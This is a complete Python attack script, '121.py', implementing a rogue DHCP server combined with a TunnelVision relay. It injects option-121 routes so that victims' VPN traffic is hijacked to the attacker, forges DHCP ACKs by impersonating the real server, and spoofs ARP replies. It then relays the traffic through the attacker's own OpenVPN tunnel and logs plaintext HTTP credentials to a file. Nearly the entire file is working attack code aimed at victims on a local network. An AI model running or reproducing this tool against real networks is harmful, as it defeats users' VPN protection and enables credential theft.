#!/usr/bin/env python3
# v2.0
"""
121.py — Rogue DHCP + TunnelVision relay (merged)

Attack flow:
  1. Wait for (or start) an OpenVPN tunnel on this machine.
  2. Derive the VPN /24 from the tun interface's assigned IP.
  3. Serve rogue DHCP to victims injecting two routes:
       • <tun /24>  via SERVER_IP  — victim VPN traffic hijacked to us
       • 0.0.0.0/0  via GATEWAY   — everything else goes direct (fast path)
  4. Set up kernel NAT so hijacked traffic is relayed through our VPN tunnel
     and replies are returned to victims.
  5. Sniff the LAN interface for plaintext HTTP credentials and objects.
"""

import argparse
import atexit
import datetime
import ipaddress
import os
import signal
import subprocess
import sys
import threading
import time

from scapy.all import (
    ARP, Ether, IP, UDP, BOOTP, DHCP,
    sniff, sendp, get_if_hwaddr, get_if_addr, get_if_list, conf
)

from _relay_linux import (
    find_tun_iface, wait_for_tun,
    find_ovpn_path, find_profiles,
    snapshot_routes, remove_pushed_routes,
    block_forward, unblock_forward,
    setup_forwarding, teardown_forwarding,
    _tun_local_ip,
)

import http_intercept

VERSION = "2.0"

# ── Globals (populated in main()) ─────────────────────────────────────────────

SERVER_IP   = None
REAL_SERVER = None
SUBNET      = None
NETMASK     = None
GATEWAY     = None
DNS         = None
LEASE_TIME  = None
IFACE       = None
IMPERSONATE = None
OPT121      = None

leases    = {}
allocated = set()
pending   = {}
pool      = []

_openvpn_proc = None
_cleanup_done  = False


# ── Cleanup ────────────────────────────────────────────────────────────────────

def _cleanup() -> None:
    global _cleanup_done
    if _cleanup_done:
        return
    _cleanup_done = True
    print("\n[*] Shutting down...")
    unblock_forward()
    teardown_forwarding()
    if _openvpn_proc and _openvpn_proc.poll() is None:
        _openvpn_proc.terminate()
        try:
            _openvpn_proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            _openvpn_proc.kill()
    print("[*] Done.")


atexit.register(_cleanup)
signal.signal(signal.SIGTERM, lambda *_: (_cleanup(), sys.exit(0)))
signal.signal(signal.SIGINT,  lambda *_: (_cleanup(), sys.exit(0)))


# ── ARP helpers ────────────────────────────────────────────────────────────────

def send_gratuitous_arp() -> None:
    """Broadcast SERVER_IP → our MAC so the victim's ARP cache is pre-populated."""
    mac = get_if_hwaddr(IFACE)
    pkt = (
        Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
        ARP(op=2, hwsrc=mac, psrc=SERVER_IP,
            hwdst="ff:ff:ff:ff:ff:ff", pdst=SERVER_IP)
    )
    sendp(pkt, iface=IFACE, verbose=False)


def _arp_announce_loop(interval: int) -> None:
    while True:
        send_gratuitous_arp()
        time.sleep(interval)


def handle_arp(pkt) -> None:
    """Reply to WHO-HAS SERVER_IP so the victim can ARP-resolve our gateway IP."""
    if not pkt.haslayer(ARP):
        return
    arp = pkt[ARP]
    if arp.op != 1 or arp.pdst != SERVER_IP:
        return
    mac   = get_if_hwaddr(IFACE)
    reply = (
        Ether(src=mac, dst=arp.hwsrc) /
        ARP(op=2, hwsrc=mac, psrc=SERVER_IP, hwdst=arp.hwsrc, pdst=arp.psrc)
    )
    sendp(reply, iface=IFACE, verbose=False)
    print(f"[ARP ] {arp.psrc} asked for {SERVER_IP} -> replied {mac}")


# ── Route encoding ─────────────────────────────────────────────────────────────

def build_opt121(routes):
    """Encode classless static routes per RFC 3442.

    Each entry: [prefix_len][significant_net_octets][4-byte_gateway]
    When option 121 is present, RFC 3442 clients MUST ignore option 3.
    """
    data = b""
    for net_cidr, gw in routes:
        net    = ipaddress.IPv4Network(net_cidr, strict=False)
        prefix = net.prefixlen
        sig    = (prefix + 7) // 8
        data  += bytes([prefix]) + net.network_address.packed[:sig]
        data  += ipaddress.IPv4Address(gw).packed
    return data


# ── Pool helpers ───────────────────────────────────────────────────────────────

def next_free_ip(mac, hint=None):
    if mac in leases:
        return leases[mac]
    if hint and hint in pool and hint not in allocated:
        return hint
    for ip in pool:
        if ip not in allocated:
            return ip
    return None


# ── DHCP handler ───────────────────────────────────────────────────────────────

def handle_dhcp(pkt):
    if not (pkt.haslayer(DHCP) and pkt.haslayer(BOOTP)):
        return

    dhcp_opts  = {opt[0]: opt[1] for opt in pkt[DHCP].options if isinstance(opt, tuple)}
    msg_type   = dhcp_opts.get("message-type")
    client_mac = pkt[Ether].src

    if msg_type == 1:   # DISCOVER
        hint     = str(dhcp_opts.get("requested_addr") or dhcp_opts.get("requested_IP_address") or "")
        offer_ip = next_free_ip(client_mac, hint or None)
        if not offer_ip:
            print("[!] Pool exhausted")
            return
        pending[client_mac] = offer_ip
        print(f"[DISCOVER] {client_mac} -> offering {offer_ip}")
        send_offer(pkt, client_mac, offer_ip)

    elif msg_type == 3:  # REQUEST
        req_server   = str(dhcp_opts.get("server_id", ""))
        requested_ip = str(
            dhcp_opts.get("requested_addr")
            or dhcp_opts.get("requested_IP_address")
            or pkt[BOOTP].ciaddr
            or ""
        )

        if req_server and req_server != SERVER_IP:
            pending.pop(client_mac, None)
            if IMPERSONATE and requested_ip and requested_ip != "0.0.0.0":
                print(f"[REQUEST] {client_mac} -> SPOOFED ACK {requested_ip} (as {req_server})")
                send_ack(pkt, client_mac, requested_ip, server_ip=req_server)
            else:
                print(f"[REQUEST] {client_mac} -> ignored (client chose {req_server})")
            return

        if not requested_ip or requested_ip == "0.0.0.0":
            requested_ip = pending.get(client_mac, "")
        if not requested_ip:
            return

        if requested_ip in pool and (requested_ip not in allocated or leases.get(client_mac) == requested_ip):
            leases[client_mac] = requested_ip
            allocated.add(requested_ip)
            pending.pop(client_mac, None)
            print(f"[REQUEST] {client_mac} -> ACK {requested_ip}")
            send_ack(pkt, client_mac, requested_ip)
        else:
            pending.pop(client_mac, None)
            print(f"[REQUEST] {client_mac} -> NAK (ip {requested_ip} unavailable)")
            send_nak(pkt, client_mac)

    elif msg_type == 7:  # RELEASE
        ip = leases.pop(client_mac, None)
        pending.pop(client_mac, None)
        if ip:
            allocated.discard(ip)
            print(f"[RELEASE] {client_mac} released {ip}")


# ── Packet builders ────────────────────────────────────────────────────────────

def build_base(pkt, client_mac, your_ip, src_ip=None):
    src_ip     = src_ip or SERVER_IP
    server_mac = get_if_hwaddr(IFACE)
    return (
        Ether(src=server_mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src=src_ip, dst="255.255.255.255") /
        UDP(sport=67, dport=68) /
        BOOTP(
            op=2,
            yiaddr=your_ip,
            siaddr=src_ip,
            chaddr=bytes.fromhex(client_mac.replace(":", "")),
            xid=pkt[BOOTP].xid,
            flags=pkt[BOOTP].flags,
        )
    )


def send_offer(pkt, client_mac, offer_ip):
    reply = build_base(pkt, client_mac, offer_ip) / DHCP(options=[
        ("message-type", "offer"),
        ("server_id",    SERVER_IP),
        ("lease_time",   LEASE_TIME),
        ("subnet_mask",  NETMASK),
        ("name_server",  DNS),
        (121, OPT121),
        "end",
    ])
    sendp(reply, iface=IFACE, verbose=False)


def send_ack(pkt, client_mac, ack_ip, server_ip=None):
    server_ip = server_ip or SERVER_IP
    reply = build_base(pkt, client_mac, ack_ip, src_ip=server_ip) / DHCP(options=[
        ("message-type", "ack"),
        ("server_id",    server_ip),
        ("lease_time",   LEASE_TIME),
        ("subnet_mask",  NETMASK),
        ("name_server",  DNS),
        (121, OPT121),
        "end",
    ])
    sendp(reply, iface=IFACE, verbose=False)


def send_nak(pkt, _):
    server_mac = get_if_hwaddr(IFACE)
    reply = (
        Ether(src=server_mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src=SERVER_IP, dst="255.255.255.255") /
        UDP(sport=67, dport=68) /
        BOOTP(op=2, xid=pkt[BOOTP].xid) /
        DHCP(options=[
            ("message-type", "nak"),
            ("server_id",    SERVER_IP),
            "end",
        ])
    )
    sendp(reply, iface=IFACE, verbose=False)


# ── OpenVPN helpers ────────────────────────────────────────────────────────────

def _check_autologin(profile_path: str) -> bool:
    try:
        with open(profile_path, errors="replace") as f:
            for line in f:
                stripped = line.strip()
                if stripped.startswith("auth-user-pass"):
                    return len(stripped.split()) >= 2
    except OSError:
        pass
    return False


def _list_profiles_table(profiles: list) -> None:
    print(f"\n{'#':<4} {'Autologin':<11} {'Modified':<22} Path")
    print("─" * 80)
    for i, (path, mtime) in enumerate(profiles, 1):
        dt   = datetime.datetime.fromtimestamp(mtime).strftime("%Y-%m-%d %H:%M")
        auto = "YES" if _check_autologin(path) else "NO"
        print(f"{i:<4} {auto:<11} {dt:<22} {path}")
    print()


def _select_profile(profiles: list, profile_arg: str | None) -> str:
    if profile_arg:
        if not os.path.isfile(profile_arg):
            sys.exit(f"[!] Profile not found: {profile_arg}")
        return profile_arg
    if not profiles:
        sys.exit(
            "[!] No .ovpn profiles found.\n"
            "    Use --profile <path> or --profile-dir <dir>."
        )
    path, mtime = profiles[0]
    dt = datetime.datetime.fromtimestamp(mtime).strftime("%Y-%m-%d %H:%M")
    print(f"[*] Selected profile: {path}  (modified {dt})")
    if not _check_autologin(path):
        print("[!] Warning: profile may require interactive auth")
    return path


def _start_openvpn(profile: str, ovpn_bin: str) -> subprocess.Popen:
    global _openvpn_proc
    proc = subprocess.Popen(
        [ovpn_bin, "--config", profile],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.STDOUT,
    )
    _openvpn_proc = proc
    print(f"[*] OpenVPN started (pid {proc.pid}) — {os.path.basename(profile)}")
    return proc


def _watch_openvpn(proc: subprocess.Popen, profile: str, ovpn_bin: str, pre_routes: set) -> None:
    global _openvpn_proc
    while True:
        time.sleep(5)
        if proc.poll() is not None:
            print(f"[!] OpenVPN exited (rc={proc.returncode}) — restarting...")
            proc = _start_openvpn(profile, ovpn_bin)
            tun = wait_for_tun(timeout=30)
            if tun:
                remove_pushed_routes(pre_routes)
            else:
                print("[!] tun did not re-appear after OpenVPN restart")


def _route_monitor(pre_routes: set, interval: int = 30) -> None:
    while True:
        time.sleep(interval)
        remove_pushed_routes(pre_routes)


# ── Entry point ────────────────────────────────────────────────────────────────

def main():
    global SERVER_IP, REAL_SERVER, SUBNET, NETMASK, GATEWAY, DNS
    global LEASE_TIME, IFACE, IMPERSONATE, OPT121, pool

    if os.geteuid() != 0:
        sys.exit("[!] Run as root:  sudo python3 121.py ...")

    parser = argparse.ArgumentParser(
        description=f"Rogue DHCP + TunnelVision relay v{VERSION}"
    )
    # Interface / identity
    parser.add_argument("-i", "--iface", default=None,
                        help="LAN interface for DHCP + sniffing (default: Scapy auto)")
    parser.add_argument("--list-ifaces", action="store_true",
                        help="Print interfaces with IPs and exit")
    parser.add_argument("--server-ip", default=None,
                        help="Our LAN IP (default: auto from interface)")
    parser.add_argument("--real-server", default="192.168.100.100",
                        help="Legit DHCP server to impersonate (default: 192.168.100.100)")
    parser.add_argument("--subnet", default="192.168.100.0",
                        help="Network address for lease pool (default: 192.168.100.0)")
    parser.add_argument("--netmask", default="255.255.255.0",
                        help="Subnet mask to advertise (default: 255.255.255.0)")
    parser.add_argument("--gateway", default=None,
                        help="Original default gateway — passthrough for non-VPN traffic "
                             "(default: --real-server)")
    parser.add_argument("--dns", default="8.8.8.8",
                        help="DNS server to advertise (default: 8.8.8.8)")
    parser.add_argument("--pool-start", type=int, default=100,
                        help="Last-octet start of lease pool (default: 100)")
    parser.add_argument("--pool-end",   type=int, default=200,
                        help="Last-octet end of lease pool (default: 200)")
    parser.add_argument("--lease-time", type=int, default=3600,
                        help="DHCP lease time in seconds (default: 3600)")
    parser.add_argument("--no-impersonate", action="store_true",
                        help="Do not forge ACKs when victim picks the real server")
    # OpenVPN
    parser.add_argument("--profile", default=None,
                        help=".ovpn profile path (omit if VPN is already running)")
    parser.add_argument("--profile-dir", default=None,
                        help="Extra directory to search for .ovpn profiles")
    parser.add_argument("--list-profiles", action="store_true",
                        help="List discovered .ovpn profiles and exit")
    parser.add_argument("--tun-timeout", type=int, default=30,
                        help="Seconds to wait for tun interface (default: 30)")
    # Intercept output
    parser.add_argument("--cred-log", default="creds.log",
                        help="File to append captured credentials (default: creds.log)")
    args = parser.parse_args()

    IFACE = args.iface or str(conf.iface)

    if args.list_ifaces:
        print(f"{'Interface':<20} IP")
        print("─" * 36)
        for iface in get_if_list():
            try:
                ip = get_if_addr(iface)
            except Exception:
                ip = "?"
            print(f"  {iface:<18} {ip}")
        return

    # Resolve our LAN IP
    if args.server_ip:
        SERVER_IP = args.server_ip
    else:
        SERVER_IP = get_if_addr(IFACE)
        if not SERVER_IP or SERVER_IP == "0.0.0.0":
            sys.exit(f"[!] Could not detect IP on {IFACE} — use --server-ip <ip>")
        print(f"[*] Auto-detected server IP: {SERVER_IP}  (from {IFACE})")

    REAL_SERVER = args.real_server
    SUBNET      = args.subnet
    NETMASK     = args.netmask
    GATEWAY     = args.gateway or REAL_SERVER   # passthrough GW = original DHCP gateway
    DNS         = args.dns
    LEASE_TIME  = args.lease_time
    IMPERSONATE = not args.no_impersonate

    pool = [
        str(ip)
        for ip in ipaddress.IPv4Network(f"{SUBNET}/24", strict=False).hosts()
        if args.pool_start <= int(str(ip).split(".")[-1]) <= args.pool_end
    ]

    extra_dirs = (args.profile_dir,) if args.profile_dir else ()
    profiles   = find_profiles(extra_dirs)

    if args.list_profiles:
        _list_profiles_table(profiles)
        return

    # ── VPN bring-up ──────────────────────────────────────────────────────────

    print("[*] Blocking FORWARD during VPN bring-up...")
    block_forward()
    pre_routes = snapshot_routes()

    tun_iface = find_tun_iface()
    if tun_iface:
        print(f"[*] VPN interface already up: {tun_iface}")
    else:
        profile  = _select_profile(profiles, args.profile)
        ovpn_bin = find_ovpn_path()
        proc     = _start_openvpn(profile, ovpn_bin)
        print(f"[*] Waiting up to {args.tun_timeout}s for tun interface...")
        tun_iface = wait_for_tun(timeout=args.tun_timeout)
        if not tun_iface:
            _cleanup()
            sys.exit(
                "[!] tun interface did not come up within the timeout.\n"
                "    Check OpenVPN logs / credentials in the profile."
            )
        print(f"[*] VPN up on interface: {tun_iface}")
        remove_pushed_routes(pre_routes)
        threading.Thread(
            target=_watch_openvpn,
            args=(proc, profile, ovpn_bin, pre_routes),
            daemon=True,
        ).start()
        threading.Thread(
            target=_route_monitor,
            args=(pre_routes,),
            daemon=True,
        ).start()

    # ── Build option-121 routes ───────────────────────────────────────────────
    # Derive the VPN subnet /24 from the tun IP — same /24 logic as relay routing.
    # e.g. tun0 assigned 10.8.0.90/28  →  target subnet 10.8.0.0/24
    # Non-VPN traffic gets 0.0.0.0/0 → GATEWAY (the original DHCP default GW).

    tun_ip = _tun_local_ip(tun_iface)
    if tun_ip:
        vpn_net24 = str(ipaddress.IPv4Interface(f"{tun_ip}/24").network)
        print(f"[*] tun IP: {tun_ip}  →  target subnet: {vpn_net24}")
        hijack_routes = [
            (vpn_net24,   SERVER_IP),  # VPN subnet → intercepted by us
            ("0.0.0.0/0", GATEWAY),    # everything else → original gateway
        ]
    else:
        print("[!] Could not read tun IP — falling back to catch-all /2 routes")
        hijack_routes = [
            ("0.0.0.0/2",   SERVER_IP),
            ("64.0.0.0/2",  SERVER_IP),
            ("128.0.0.0/2", SERVER_IP),
            ("192.0.0.0/2", SERVER_IP),
        ]

    OPT121 = build_opt121(hijack_routes)

    # ── NAT relay ─────────────────────────────────────────────────────────────

    setup_forwarding(IFACE, tun_iface)
    unblock_forward()
    print(f"[*] NAT relay active: {IFACE} → {tun_iface} (MASQUERADE on tun)")

    # ── HTTP credential sniffing ───────────────────────────────────────────────
    # Sniff the LAN interface: plaintext victim requests arrive here, and
    # un-NATed responses return here — both directions are visible with original IPs.

    http_intercept.CRED_LOG = args.cred_log
    print(f"[*] Credential log : {os.path.abspath(args.cred_log)}")
    print(f"[*] HTTP objects   : {http_intercept.INTERCEPT_DIR}")
    print(f"[*] Sniffing on    : {IFACE}  (plaintext LAN traffic)")
    threading.Thread(
        target=http_intercept.sniff_loop,
        args=(IFACE,),
        daemon=True,
    ).start()

    # ── DHCP rogue server ─────────────────────────────────────────────────────

    print(f"\n[*] DHCP rogue server v{VERSION}  iface={IFACE}  server={SERVER_IP}")
    print(f"[*] Pool : {SUBNET} [{args.pool_start}-{args.pool_end}]  GW: {GATEWAY}  DNS: {DNS}")
    print(f"[*] Impersonation : {'ON (spoofing ' + REAL_SERVER + ')' if IMPERSONATE else 'OFF'}")
    print(f"[*] Route inject  : {hijack_routes}")
    print("[*] Ready — Ctrl+C to stop\n")

    send_gratuitous_arp()
    threading.Thread(target=_arp_announce_loop, args=(5,), daemon=True).start()

    def _packet_handler(pkt):
        if pkt.haslayer(ARP):
            handle_arp(pkt)
        else:
            handle_dhcp(pkt)

    sniff(
        iface=IFACE,
        filter="(udp and (port 67 or port 68)) or arp",
        prn=_packet_handler,
        store=False,
    )


if __name__ == "__main__":
    main()
